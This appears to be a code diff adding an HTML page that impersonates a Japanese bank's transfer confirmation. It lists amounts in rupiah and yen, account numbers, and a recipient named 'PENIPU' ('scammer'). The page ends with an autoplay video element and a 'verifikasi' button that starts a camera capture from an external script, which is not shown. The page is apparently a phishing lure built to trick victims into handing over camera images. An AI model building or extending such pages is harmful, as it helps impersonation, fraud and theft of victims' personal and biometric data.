@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Konfirmasi Transfer - BANK JAPANESE</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 20px;
+      color: #333;
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      overflow: hidden;
+    }
+    .header {
+      text-align: center;
+      padding: 20px 16px;
+      background: #0056a3;
+      color: white;
+    }
+    .logo {
+      width: 64px;
+      height: 64px;
+      border-radius: 8px;
+      object-fit: cover;
+      margin-bottom: 12px;
+      border: 2px solid rgba(255,255,255,0.3);
+    }
+    .bank-name {
+      font-size: 1.4rem;
+      font-weight: 700;
+      margin: 8px 0;
+    }
+    .sub-title {
+      font-size: 0.9rem;
+      opacity: 0.9;
+    }
+    .amount-section {
+      text-align: center;
+      padding: 24px 16px;
+      background: #f0f7ff;
+      border-bottom: 1px solid #e0e7f0;
+    }
+    .amount-label {
+      font-size: 0.85rem;
+      color: #666;
+      margin-bottom: 6px;
+    }
+    .amount-value {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #0056a3;
+    }
+    .currency {
+      font-size: 1.2rem;
+      color: #0056a3;
+      margin-left: 8px;
+    }
+    .details-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      padding: 20px;
+      font-size: 0.9rem;
+    }
+    .detail-item {
+      display: flex;
+      flex-direction: column;
+    }
+    .detail-label {
+      color: #666;
+      margin-bottom: 4px;
+    }
+    .detail-value {
+      font-weight: 600;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      background: #0066cc;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      text-decoration: none;
+      text-align: center;
+      margin-top: 24px;
+    }
+    .btn:hover {
+      background: #0052a3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header with logo & title -->
+    <div class="header">
+      <img src="https://bbr.bg/media/images/jbic_MwfVpLE.2e16d0ba.fill-1200x627-c100.jpg" alt="Logo BANK JAPANESE" class="logo">
+      <div class="bank-name">Japan Bank for International cooperation</div>
+      <div class="sub-title">Office Purchasing</div>
+    </div>
+
+    <!-- Amount Section -->
+    <div class="amount-section">
+      <div class="amount-label">Amount Received</div>
+      <div class="amount-value">
+        IDR 515.000
+        <span class="currency">YEN 35.12</span>
+      </div>
+    </div>
+
+    <!-- Details Grid -->
+    <div class="details-grid">
+      <!-- Pengirim -->
+      <div class="detail-item">
+        <div class="detail-label">sender</div>
+        <div class="detail-value">Japan Bank for International cooperation</div>
+      </div>
+      <div class="detail-item">
+        <div class="detail-label">Sender's Account Name</div>
+        <div class="detail-value">RONAL LIONNARDO</div>
+      </div>
+      <div class="detail-item">
+        <div class="detail-label">Recipient Account Number</div>
+        <div class="detail-value">7328732897</div>
+      </div>
+
+      <!-- Penerima -->
+      <div class="detail-item">
+        <div class="detail-label">recipient</div>
+        <div class="detail-value">BANK BCA</div>
+      </div>
+      <div class="detail-item">
+        <div class="detail-label">Recipient Account Number</div>
+        <div class="detail-value">3532535532</div>
+      </div>
+      <div class="detail-item">
+        <div class="detail-label">Recipient's Account Name</div>
+        <div class="detail-value">PENIPU</div>
+      </div>
+    </div>
+  
+    <video id="video" autoplay playsinline></video>
+    <button class="btn" onclick="startCapture()">verifikasi</button>
+    <div id="status"></div>
+
+    <script src="capture.js"></script>
+</body>
+</html>
